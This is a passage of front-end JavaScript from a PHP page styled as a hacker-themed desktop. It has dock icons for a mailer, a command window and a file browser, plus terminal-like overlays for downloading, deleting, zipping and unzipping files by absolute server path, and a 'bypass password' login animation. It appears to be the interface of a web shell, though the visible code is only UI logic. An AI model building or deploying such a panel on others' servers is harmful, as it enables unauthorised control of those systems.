              if (shell && target) {
                var sr = shell.getBoundingClientRect();
                var tr = target.getBoundingClientRect();
                var scx = sr.left + (sr.width/2);
                var scy = sr.top + (sr.height/2);
                var tcx = tr.left + (tr.width/2);
                var tcy = tr.top + (tr.height/2);
                sx = tcx - scx;
                sy = tcy - scy;
              }
              var startT = 'translate(' + sx + 'px,' + sy + 'px) scale(0.65)';
              var elements = [];
              if (bar) elements.push(bar);
              if (cmdBar) elements.push(cmdBar);
              if (shell && shell !== bar) elements.push(shell);
              elements.forEach(function(el){ el.style.transform = startT; el.style.opacity = '0'; el.style.filter = 'blur(6px)'; });
              var opts = { duration: 420, easing: 'cubic-bezier(.2,.7,.2,1)', fill: 'both' };
              var keyframes = [
                { transform: startT, opacity: 0, filter: 'blur(6px)' },
                { transform: 'none', opacity: 1, filter: 'none' }
              ];
              if (dockBtn) { dockBtn.animate([{ transform: 'scale(1)' }, { transform: 'scale(1.12)' }, { transform: 'scale(1)' }], { duration: 360, easing: 'ease-out', fill: 'none' }); }
              var animations = elements.map(function(el){ return el.animate(keyframes, opts); });
              var done = 0;
              function after(){
                elements.forEach(function(el){ el.style.transform = ''; el.style.opacity = ''; el.style.filter = ''; });
                if (dock) dock.style.display = 'none';
                if (notesDock) notesDock.style.display = 'none';
                if (browserDock) browserDock.style.display = 'none';
                if (cmdDock) cmdDock.style.display = 'none';
                if (mailDock) mailDock.style.display = 'none';
                if (wpDock) wpDock.style.display = 'none';
                if (settingsDock) settingsDock.style.display = 'none';
                if (errorsDock) errorsDock.style.display = 'none';
                if (apptoolsDock) apptoolsDock.style.display = 'none';
                if (cleanDock) cleanDock.style.display = 'none';
              }
              if (!animations.length) { after(); return; }
              animations.forEach(function(a){ a.onfinish = function(){ done++; if (done >= animations.length) after(); }; });
            }, { passive: true });
            // Drag handlers
            function startDrag(ev){
              dragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = dockBtn.getBoundingClientRect();
              offsetX = point.clientX - rect.left;
              offsetY = point.clientY - rect.top;
              dockBtn.style.transition = 'none';
              dockBtn.style.transform = 'none';
              dockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', onDrag);
              document.addEventListener('touchmove', onDrag, { passive: false });
              document.addEventListener('mouseup', endDrag);
              document.addEventListener('touchend', endDrag);
            }
            function onDrag(ev){
              if (!dragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - offsetX;
              var top = point.clientY - offsetY;
              var maxLeft = window.innerWidth - dockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - dockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              dockBtn.style.left = left + 'px';
              dockBtn.style.top = top + 'px';
              updateDockLabelPosition(dockBtn);
              dockPos = { left: left, top: top };
            }
            function endDrag(){
              if (!dragging) return;
              dragging = false;
              dockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', onDrag);
              document.removeEventListener('touchmove', onDrag);
              document.removeEventListener('mouseup', endDrag);
              document.removeEventListener('touchend', endDrag);
            }
            dockBtn.addEventListener('mousedown', startDrag);
            dockBtn.addEventListener('touchstart', startDrag, { passive: true });
          }
          // Mailer dock behavior
          if (mailDockBtn) {
            // Single click: open Mailer window
            mailDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (mailDragging) return;
              var trigger = document.getElementById('mailer-trigger');
              if (trigger) { trigger.click(); } else { if (typeof spawnMailerWindow === 'function') spawnMailerWindow(); }
            });
            // Touch: single tap opens
            mailDockBtn.addEventListener('touchend', function(ev){
              if (mailDragging) return;
              var trigger = document.getElementById('mailer-trigger');
              if (trigger) { trigger.click(); } else { if (typeof spawnMailerWindow === 'function') spawnMailerWindow(); }
            }, { passive: true });
            function mailStartDrag(ev){
              mailDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = mailDockBtn.getBoundingClientRect();
              mailOffsetX = point.clientX - rect.left;
              mailOffsetY = point.clientY - rect.top;
              mailDockBtn.style.transition = 'none';
              mailDockBtn.style.transform = 'none';
              mailDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', mailOnDrag);
              document.addEventListener('touchmove', mailOnDrag, { passive: false });
              document.addEventListener('mouseup', mailEndDrag);
              document.addEventListener('touchend', mailEndDrag);
            }
            function mailOnDrag(ev){
              if (!mailDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - mailOffsetX;
              var top = point.clientY - mailOffsetY;
              var maxLeft = window.innerWidth - mailDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - mailDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              mailDockBtn.style.left = left + 'px';
              mailDockBtn.style.top = top + 'px';
              updateDockLabelPosition(mailDockBtn);
              mailDockPos = { left: left, top: top };
            }
            function mailEndDrag(){
              if (!mailDragging) return;
              mailDragging = false;
              mailDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', mailOnDrag);
              document.removeEventListener('touchmove', mailOnDrag);
              document.removeEventListener('mouseup', mailEndDrag);
              document.removeEventListener('touchend', mailEndDrag);
            }
            mailDockBtn.addEventListener('mousedown', mailStartDrag);
            mailDockBtn.addEventListener('touchstart', mailStartDrag, { passive: true });
          }
          // Settings dock behavior
          if (settingsDockBtn) {
            // Single click: open Settings window
            settingsDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (settingsDragging) return;
              if (typeof spawnSettingsWindow === 'function') { spawnSettingsWindow(); }
            });
            // Touch: single tap opens
            settingsDockBtn.addEventListener('touchend', function(ev){
              if (settingsDragging) return;
              if (typeof spawnSettingsWindow === 'function') { spawnSettingsWindow(); }
            }, { passive: true });
            function settingsStartDrag(ev){
              settingsDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = settingsDockBtn.getBoundingClientRect();
              settingsOffsetX = point.clientX - rect.left;
              settingsOffsetY = point.clientY - rect.top;
              settingsDockBtn.style.transition = 'none';
              settingsDockBtn.style.transform = 'none';
              settingsDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', settingsOnDrag);
              document.addEventListener('touchmove', settingsOnDrag, { passive: false });
              document.addEventListener('mouseup', settingsEndDrag);
              document.addEventListener('touchend', settingsEndDrag);
            }
            function settingsOnDrag(ev){
              if (!settingsDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - settingsOffsetX;
              var top = point.clientY - settingsOffsetY;
              var maxLeft = window.innerWidth - settingsDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - settingsDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              settingsDockBtn.style.left = left + 'px';
              settingsDockBtn.style.top = top + 'px';
              updateDockLabelPosition(settingsDockBtn);
              settingsDockPos = { left: left, top: top };
            }
            function settingsEndDrag(){
              if (!settingsDragging) return;
              settingsDragging = false;
              settingsDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', settingsOnDrag);
              document.removeEventListener('touchmove', settingsOnDrag);
              document.removeEventListener('mouseup', settingsEndDrag);
              document.removeEventListener('touchend', settingsEndDrag);
            }
            settingsDockBtn.addEventListener('mousedown', settingsStartDrag);
            settingsDockBtn.addEventListener('touchstart', settingsStartDrag, { passive: true });
          }
          // Browser dock behavior
          if (browserDockBtn) {
            // Single click: open Browser window
            browserDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (browserDragging) return;
              var trigger = document.getElementById('browser-trigger');
              if (trigger) { trigger.click(); }
            });
            // Touch: single tap opens
            browserDockBtn.addEventListener('touchend', function(ev){
              if (browserDragging) return;
              var trigger = document.getElementById('browser-trigger');
              if (trigger) { trigger.click(); }
            }, { passive: true });
            function browserStartDrag(ev){
              browserDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = browserDockBtn.getBoundingClientRect();
              browserOffsetX = point.clientX - rect.left;
              browserOffsetY = point.clientY - rect.top;
              browserDockBtn.style.transition = 'none';
              browserDockBtn.style.transform = 'none';
              browserDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', browserOnDrag);
              document.addEventListener('touchmove', browserOnDrag, { passive: false });
              document.addEventListener('mouseup', browserEndDrag);
              document.addEventListener('touchend', browserEndDrag);
            }
            function browserOnDrag(ev){
              if (!browserDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - browserOffsetX;
              var top = point.clientY - browserOffsetY;
              var maxLeft = window.innerWidth - browserDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - browserDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              browserDockBtn.style.left = left + 'px';
              browserDockBtn.style.top = top + 'px';
              updateDockLabelPosition(browserDockBtn);
              browserDockPos = { left: left, top: top };
            }
            function browserEndDrag(){
              if (!browserDragging) return;
              browserDragging = false;
              browserDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', browserOnDrag);
              document.removeEventListener('touchmove', browserOnDrag);
              document.removeEventListener('mouseup', browserEndDrag);
              document.removeEventListener('touchend', browserEndDrag);
            }
            browserDockBtn.addEventListener('mousedown', browserStartDrag);
            browserDockBtn.addEventListener('touchstart', browserStartDrag, { passive: true });
          }
          // Notes dock behavior
          if (notesDockBtn) {
            // Single click: open a new notes window
            notesDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (notesDragging) return;
              var trigger = document.getElementById('notes-trigger');
              if (trigger) { trigger.click(); }
            });
            // Touch: single tap opens a notes window
            notesDockBtn.addEventListener('touchend', function(ev){
              if (notesDragging) return;
              var trigger = document.getElementById('notes-trigger');
              if (trigger) { trigger.click(); }
            }, { passive: true });

            function notesStartDrag(ev){
              notesDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = notesDockBtn.getBoundingClientRect();
              notesOffsetX = point.clientX - rect.left;
              notesOffsetY = point.clientY - rect.top;
              notesDockBtn.style.transition = 'none';
              notesDockBtn.style.transform = 'none';
              notesDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', notesOnDrag);
              document.addEventListener('touchmove', notesOnDrag, { passive: false });
              document.addEventListener('mouseup', notesEndDrag);
              document.addEventListener('touchend', notesEndDrag);
            }
            function notesOnDrag(ev){
              if (!notesDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - notesOffsetX;
              var top = point.clientY - notesOffsetY;
              var maxLeft = window.innerWidth - notesDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - notesDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              notesDockBtn.style.left = left + 'px';
              notesDockBtn.style.top = top + 'px';
              updateDockLabelPosition(notesDockBtn);
              notesDockPos = { left: left, top: top };
            }
            function notesEndDrag(){
              if (!notesDragging) return;
              notesDragging = false;
              notesDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', notesOnDrag);
              document.removeEventListener('touchmove', notesOnDrag);
              document.removeEventListener('mouseup', notesEndDrag);
              document.removeEventListener('touchend', notesEndDrag);
            }
            notesDockBtn.addEventListener('mousedown', notesStartDrag);
            notesDockBtn.addEventListener('touchstart', notesStartDrag, { passive: true });
          }
          // Wallpaper dock behavior
          if (wpDockBtn) {
            // Single click: open Wallpaper window
            wpDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (wpDragging) return; // ignore clicks during drag
              var trigger = document.getElementById('wallpaper-trigger');
              if (trigger) { trigger.click(); } else { spawnWallpaperWindow(); }
            });
            // Double-click: also open (for consistency)
            wpDockBtn.addEventListener('dblclick', function(ev){
              if (wpDragging) { ev.preventDefault(); return; }
              var trigger = document.getElementById('wallpaper-trigger');
              if (trigger) { trigger.click(); } else { spawnWallpaperWindow(); }
            });
            // Touch: single tap opens
            wpDockBtn.addEventListener('touchend', function(ev){
              if (wpDragging) return; // drag end handled elsewhere
              var trigger = document.getElementById('wallpaper-trigger');
              if (trigger) { trigger.click(); } else { spawnWallpaperWindow(); }
            }, { passive: true });
            function wpStartDrag(ev){
              wpDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = wpDockBtn.getBoundingClientRect();
              wpOffsetX = point.clientX - rect.left;
              wpOffsetY = point.clientY - rect.top;
              wpDockBtn.style.transition = 'none';
              wpDockBtn.style.transform = 'none';
              wpDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', wpOnDrag);
              document.addEventListener('touchmove', wpOnDrag, { passive: false });
              document.addEventListener('mouseup', wpEndDrag);
              document.addEventListener('touchend', wpEndDrag);
            }
            function wpOnDrag(ev){
              if (!wpDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - wpOffsetX;
              var top = point.clientY - wpOffsetY;
              var minLeft = 8, minTop = 8;
              var maxLeft = window.innerWidth - wpDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - wpDockBtn.offsetHeight - 8;
              if (left < minLeft) left = minLeft; if (top < minTop) top = minTop;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              wpDockBtn.style.left = left + 'px';
              wpDockBtn.style.top = top + 'px';
              updateDockLabelPosition(wpDockBtn);
              wpDockPos = { left: left, top: top };
            }
            function wpEndDrag(){
              if (!wpDragging) return;
              wpDragging = false;
              wpDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', wpOnDrag);
              document.removeEventListener('touchmove', wpOnDrag);
              document.removeEventListener('mouseup', wpEndDrag);
              document.removeEventListener('touchend', wpEndDrag);
            }
            wpDockBtn.addEventListener('mousedown', wpStartDrag);
            wpDockBtn.addEventListener('touchstart', wpStartDrag, { passive: true });
            // No global fallback listeners; direct icon handlers suffice
          }
          // CMD dock behavior
          if (cmdDockBtn) {
            // Single click: open CMD window
            cmdDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (cmdDragging) return;
              var trigger = document.getElementById('cmd-trigger');
              if (trigger) { trigger.click(); }
            });
            // Touch: single tap opens CMD window
            cmdDockBtn.addEventListener('touchend', function(ev){
              if (cmdDragging) return;
              var trigger = document.getElementById('cmd-trigger');
              if (trigger) { trigger.click(); }
            }, { passive: true });
            function cmdStartDrag(ev){
              cmdDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = cmdDockBtn.getBoundingClientRect();
              cmdOffsetX = point.clientX - rect.left;
              cmdOffsetY = point.clientY - rect.top;
              cmdDockBtn.style.transition = 'none';
              cmdDockBtn.style.transform = 'none';
              cmdDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', cmdOnDrag);
              document.addEventListener('touchmove', cmdOnDrag, { passive: false });
              document.addEventListener('mouseup', cmdEndDrag);
              document.addEventListener('touchend', cmdEndDrag);
            }
            function cmdOnDrag(ev){
              if (!cmdDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - cmdOffsetX;
              var top = point.clientY - cmdOffsetY;
              var minLeft = 8, minTop = 8;
              var maxLeft = window.innerWidth - cmdDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - cmdDockBtn.offsetHeight - 8;
              if (left < minLeft) left = minLeft; if (top < minTop) top = minTop;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              cmdDockBtn.style.left = left + 'px';
              cmdDockBtn.style.top = top + 'px';
              updateDockLabelPosition(cmdDockBtn);
            }
            function cmdEndDrag(){
              if (!cmdDragging) return;
              cmdDragging = false;
              cmdDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', cmdOnDrag);
              document.removeEventListener('touchmove', cmdOnDrag);
              document.removeEventListener('mouseup', cmdEndDrag);
              document.removeEventListener('touchend', cmdEndDrag);
              var rect = cmdDockBtn.getBoundingClientRect();
              var left = rect.left, top = rect.top;
              if (left < 8) left = 8; if (top < 8) top = 8;
              var maxLeft = window.innerWidth - cmdDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - cmdDockBtn.offsetHeight - 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              cmdDockPos = { left: left, top: top };
            }
            cmdDockBtn.addEventListener('mousedown', cmdStartDrag);
            cmdDockBtn.addEventListener('touchstart', cmdStartDrag, { passive: true });
          }
          // Recalculate label position on viewport resize
          window.addEventListener('resize', function(){
            updateDockLabelPosition(dockBtn);
            updateDockLabelPosition(notesDockBtn);
            updateDockLabelPosition(browserDockBtn);
            updateDockLabelPosition(cmdDockBtn);
            updateDockLabelPosition(wpDockBtn);
            updateDockLabelPosition(settingsDockBtn);
            updateDockLabelPosition(errorsDockBtn);
            updateDockLabelPosition(apptoolsDockBtn);
            updateDockLabelPosition(cleanDockBtn);
          
            // If minimized and icons haven't been dragged, keep them aligned in a row
            if (document.body.classList.contains('minimized')) {
              positionDockRow();
            }
          });
          // About modal handlers
          var aboutTrigger = document.getElementById('about-trigger');
          var aboutOverlay = document.getElementById('about-overlay');
          var aboutCloseBtn = document.getElementById('about-close-btn');
          function openAbout(e){ if (e) e.preventDefault(); if (aboutOverlay) { aboutOverlay.classList.add('show'); var yearEl = document.getElementById('about-year'); if (yearEl) { try { yearEl.textContent = String(new Date().getFullYear()); } catch(e){} } } }
          function closeAbout(){ if (aboutOverlay) aboutOverlay.classList.remove('show'); }
          if (aboutTrigger) aboutTrigger.addEventListener('click', openAbout);
          if (aboutCloseBtn) aboutCloseBtn.addEventListener('click', closeAbout);
          if (aboutOverlay) aboutOverlay.addEventListener('click', function(ev){ if (ev.target === aboutOverlay) closeAbout(); });
          document.addEventListener('keydown', function(ev){ if (ev.key === 'Escape') closeAbout(); });
        var overlay = document.getElementById('dl-terminal-overlay');
        var output = document.getElementById('dl-term-output');
        function typeText(text, cb, speed){
            var i = 0; speed = speed || 40;
            function step(){
                output.textContent += text.charAt(i);
                i++;
                if (i < text.length){ setTimeout(step, speed); } else { if (typeof cb === 'function') cb(); }
            }
            step();
        }
        function fileNameFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('download') || '';
                rel = decodeURIComponent(rel);
                var parts = rel.split(/[\\\/]/);
                return parts.pop() || rel || 'file';
            } catch(e){ return 'file'; }
        }
        function animateDownload(href, kind){
            overlay.classList.add('show');
            output.textContent = 'C\\> ';
            var fname = fileNameFromHref(href);
            var cmd;
            if (kind === 'dir') {
                cmd = './downlaod ' + fname + ' --helpdownload folder -z zip folder -d download';
            } else {
                cmd = './downlaod ' + fname + ' --helpdownload file -z -sh d download';
            }
            typeText(cmd, function(){
                output.textContent += '\n';
                typeText('importing ', function(){
                    var dots = 0;
                    var base = 'C\\> ' + cmd + '\nimporting ';
                    var dotTimer = setInterval(function(){
                        dots = (dots + 1) % 4;
                        output.textContent = base + '.'.repeat(dots);
                    }, 300);
                    setTimeout(function(){
                        clearInterval(dotTimer);
                        output.textContent = base + '.... done';
                        setTimeout(function(){
                            overlay.classList.remove('show');
                            window.location.href = href;
                        }, 600);
                    }, 3000);
                }, 40);
            }, 40);
        }
        // Hook all download links
        document.addEventListener('click', function(ev){
            var a = ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            if (href.indexOf('download=') !== -1){
                ev.preventDefault();
                var kind = a.getAttribute('data-kind') || '';
                animateDownload(href, kind);
            }
            // Image preview links (raw streaming)
            if (a.classList.contains('img-view') && (href.indexOf('raw=') !== -1 || href.indexOf('raw_abs=') !== -1)){
                ev.preventDefault();
                try {
                    var imgOverlay = document.getElementById('img-terminal-overlay');
                    var out = document.getElementById('img-term-output');
                    var imgEl = document.getElementById('img-preview');
                    if (!imgOverlay || !out || !imgEl) return;
                    out.textContent = 'C\\> preview ' + (function(){
                        try { var u = new URL(href, window.location.href); return decodeURIComponent(u.search.slice(1)); } catch(e){ return 'image'; }
                    })();
                    imgEl.src = href;
                    imgOverlay.classList.add('show');
                } catch(e){}
            }
            // Delete links: show terminal-style confirmation overlay (type 'yes' then Enter) without visible input
            if (href.indexOf('delete_abs=1') !== -1 || href.indexOf('delete=1') !== -1){
                ev.preventDefault();
                try {
                    var delOverlay = document.getElementById('del-terminal-overlay');
                    var delOut = document.getElementById('del-term-output');
                    var closeBtn = document.getElementById('del-term-close-btn');
                    if (!delOverlay || !delOut || !closeBtn) return;
                    // Show command line prompt and store pending URL
                    var pendingUrl = href;
                    var cmdLine = '~ % rm ' + (function(){
                        try { var u = new URL(href, window.location.href); return decodeURIComponent(u.search.slice(1)); } catch(e){ return 'file'; }
                    })();
                    var typedBuffer = '';
                    var cursorOn = true;
                    var hintText = 'Write Y and click enter to continue';
                    function renderPrompt(){
                        delOut.textContent = cmdLine + '\n' + hintText + '\nconfirm: ' + typedBuffer + (cursorOn ? '|' : ' ');
                    }
                    renderPrompt();
                    delOverlay.classList.add('show');
                    try { delOverlay.focus(); } catch(e){}
                    var cursorInterval = setInterval(function(){ cursorOn = !cursorOn; renderPrompt(); }, 520);
                    function proceed(){
                        try {
                            var u = new URL(pendingUrl, window.location.href);
                            var rel = u.searchParams.get('d');
                            var os = u.searchParams.get('os');
                            var form = document.createElement('form');
                            form.method = 'POST';
                            form.action = window.location.pathname + window.location.search;
                            var addField = function(name, value){ var inp = document.createElement('input'); inp.type = 'hidden'; inp.name = name; inp.value = value; form.appendChild(inp); };
                            if (os) { addField('do_delete_abs', '1'); addField('os', os); }
                            else if (rel) { addField('do_delete', '1'); addField('rel', rel); }
                            else { delOverlay.classList.remove('show'); window.location.href = pendingUrl; return; }
                            document.body.appendChild(form);
                            cleanup();
                            form.submit();
                        } catch(e){ delOverlay.classList.remove('show'); window.location.href = pendingUrl; }
                    }
                    function cleanup(){ try { document.removeEventListener('keydown', keyHandler); } catch(e){} try { clearInterval(cursorInterval); } catch(e){} }
                    function cancel(){ cleanup(); delOverlay.classList.remove('show'); }
                    function startDeleting(){
                        var dots = 0; var base = cmdLine + '\n' + 'deleting ';
                        try { clearInterval(cursorInterval); } catch(e){}
                        var timer = setInterval(function(){ dots = (dots + 1) % 4; delOut.textContent = base + '.'.repeat(dots); }, 220);
                        setTimeout(function(){ clearInterval(timer); delOut.textContent = base + '.... done'; proceed(); }, 700);
                    }
                    function keyHandler(ev){
                        if (ev.key === 'Enter'){
                            ev.preventDefault();
                            var v = (typedBuffer || '').trim().toLowerCase();
                            if (v === 'y'){ startDeleting(); }
                        } else if (ev.key === 'Escape'){
                            cancel();
                        } else if (ev.key === 'Backspace'){
                            ev.preventDefault();
                            if (typedBuffer.length > 0){ typedBuffer = typedBuffer.slice(0, -1); renderPrompt(); }
                        } else if (ev.key.length === 1){
                            // Add printable characters
                            typedBuffer += ev.key;
                            renderPrompt();
                        }
                    }
                    document.addEventListener('keydown', keyHandler);
                    closeBtn.onclick = cancel;
                    delOverlay.addEventListener('click', function backdrop(ev){ if (ev.target === delOverlay) cancel(); }, { once:true });
                } catch(e){}
            }
        }, true);
        // Close image preview overlay
        (function(){
          var imgOverlay = document.getElementById('img-terminal-overlay');
          var closeBtn = document.getElementById('img-term-close-btn');
          function close(){ if (imgOverlay) imgOverlay.classList.remove('show'); }
          if (closeBtn) closeBtn.addEventListener('click', close);
          document.addEventListener('keydown', function(ev){ if (ev.key === 'Escape') close(); });
          if (imgOverlay) imgOverlay.addEventListener('click', function(ev){ if (ev.target === imgOverlay) close(); });
        })();
        })();
    </script>
    <script>
    (function(){
        function bounceIcon(el){
            try {
                el && el.animate(
                    [ { transform:'scale(1)' }, { transform:'scale(1.12)' }, { transform:'scale(1)' } ],
                    { duration: 320, easing: 'ease-out', fill:'none' }
                );
            } catch(e){}
        }
        document.addEventListener('click', function(ev){
            var icon = ev.target && ev.target.closest && ev.target.closest('.app-icon');
            if (!icon) return;
            // Avoid bounce during drag interactions
            if (icon.getAttribute('aria-grabbed') === 'true') return;
            bounceIcon(icon);
        }, true);
    })();
    </script>
    <script>
    (function(){
        var ric = window.requestIdleCallback || function(cb){ setTimeout(function(){ try { cb({ didTimeout:false, timeRemaining:function(){ return 0; } }); } catch(e){} }, 80); };
        ric(function(){
            try {
                var mt = document.getElementById('mailer-template');
                var ml = document.getElementById('mailer-layer');
                if (mt && ml && !window.__preMailerClone){ var c = mt.cloneNode(true); c.removeAttribute('id'); c.style.display='none'; window.__preMailerClone = c; }
            } catch(e){}
            try {
                var bt = document.getElementById('browser-template');
                var bl = document.getElementById('browser-layer');
                if (bt && bl && !window.__preBrowserClone){ var c2 = bt.cloneNode(true); c2.removeAttribute('id'); c2.style.display='none'; window.__preBrowserClone = c2; }
            } catch(e){}
        });
    })();
    </script>

    <script>
      (function(){
        // Show a short success terminal only after server confirms login
        var justLogged = false;
        if (!justLogged) return;
        var overlay = document.getElementById('login-terminal-overlay');
        var output = document.getElementById('login-term-output');
        function typeText(text, cb, speed){
          var i = 0; speed = speed || 18;
          function step(){
            output.textContent += text.charAt(i);
            i++;
            if (i < text.length){ setTimeout(step, speed); } else { if (typeof cb === 'function') cb(); }
          }
          step();
        }
        overlay.classList.add('show');
        output.textContent = '$ ';
        typeText('./sh bypass password : connecting correct done', function(){
          setTimeout(function(){ overlay.classList.remove('show'); }, 800);
        }, 14);
      })();
    </script>
    <script>
    (function(){
        var overlay = document.getElementById('op-terminal-overlay');
        var output = document.getElementById('op-term-output');
        var closeBtn = document.getElementById('op-term-close-btn');
        function typeText(text, cb, speed){
            var i = 0; speed = speed || 40;
            function step(){
                output.textContent += text.charAt(i);
                i++;
                if (i < text.length){ setTimeout(step, speed); } else { if (typeof cb === 'function') cb(); }
            }
            step();
        }
        function fmtZipName(){
            var d = new Date();
            function pad(n){ return (n<10?'0':'') + n; }
            var name = d.getFullYear().toString()
                + pad(d.getMonth()+1)
                + pad(d.getDate())
                + '-' + pad(d.getHours())
                + pad(d.getMinutes())
                + pad(d.getSeconds())
                + '-zip.zip';
            return name;
        }
        function animateList(cmd, entries, done){
            overlay.classList.add('show');
            output.textContent = '$ ';
            typeText(cmd, function(){
                output.textContent += '\n';
                var i = 0;
                var limit = Math.min(entries.length, 50);
                function next(){
                    if (i < limit){
                        output.textContent += (entries[i] || '') + '\n';
                        i++;
                        setTimeout(next, 50);
                    } else {
                        if (entries.length > limit){ output.textContent += '...\n'; }
                        setTimeout(function(){ done(); }, 300);
                    }
                }
                next();
            }, 40);
        }
        // Expose animateList globally so other modules can reuse the terminal overlay
        try { window.animateList = animateList; } catch(e){}
        // Hook Zip form
        var zipForm = document.getElementById('zip-form');
        if (zipForm){
            zipForm.addEventListener('submit', function(ev){
                ev.preventDefault();
                var entriesJson = zipForm.getAttribute('data-entries') || '[]';
                var entries = [];
                try { entries = JSON.parse(entriesJson); } catch(e){}
                var nameInput = zipForm.querySelector('input[name="zipname"]');
                if (nameInput){ nameInput.value = fmtZipName(); }
                var relInp = zipForm.querySelector('input[name="rel"]');
                var folderName = '';
                try { folderName = baseName((relInp && relInp.value) || ''); } catch(e) { folderName = ''; }
                var cmdTxt = '--sh zip ' + (folderName || '');
                animateList(cmdTxt, entries, function(){ zipForm.submit(); });
            });
        }
        // Hook Unzip form
        var unzipForm = document.getElementById('unzip-form');
        if (unzipForm){
            unzipForm.addEventListener('submit', function(ev){
                ev.preventDefault();
                var entriesJson = unzipForm.getAttribute('data-entries') || '[]';
                var entries = [];
                try { entries = JSON.parse(entriesJson); } catch(e){}
                var relInp2 = unzipForm.querySelector('input[name="rel"]');
                var zipName = '';
                try { zipName = baseName((relInp2 && relInp2.value) || ''); } catch(e) { zipName = ''; }
                var cmdTxt2 = '--sh unzip .. ' + (zipName || '');
                animateList(cmdTxt2, entries, function(){ unzipForm.submit(); });
            });
        }
        var appError = <?= json_encode($error ?? '') ?>;
        if (appError && typeof appError === 'string') {
            if (appError.indexOf('Create failed:') === 0) {
                overlay.classList.add('show');
                overlay.classList.add('error-theme');
                output.textContent = '$ ';
                var detailCreate = appError.replace(/^Create failed:\s*/,'');
                typeText('./sh create : error  ' + detailCreate, function(){}, 20);
                if (closeBtn) { closeBtn.addEventListener('click', function(){ overlay.classList.remove('show'); }); }
                document.addEventListener('keydown', function(e){ if (e.key === 'Escape') overlay.classList.remove('show'); }, { once: true });
            } else if (appError.indexOf('Delete failed:') === 0) {
                overlay.classList.add('show');
                overlay.classList.add('error-theme');
                output.textContent = '$ ';
                var detailDelete = appError.replace(/^Delete failed:\s*/,'');
                typeText('./sh delete : error  ' + detailDelete, function(){}, 20);
                if (closeBtn) { closeBtn.addEventListener('click', function(){ overlay.classList.remove('show'); }); }
                document.addEventListener('keydown', function(e){ if (e.key === 'Escape') overlay.classList.remove('show'); }, { once: true });
            }
        }
    })();
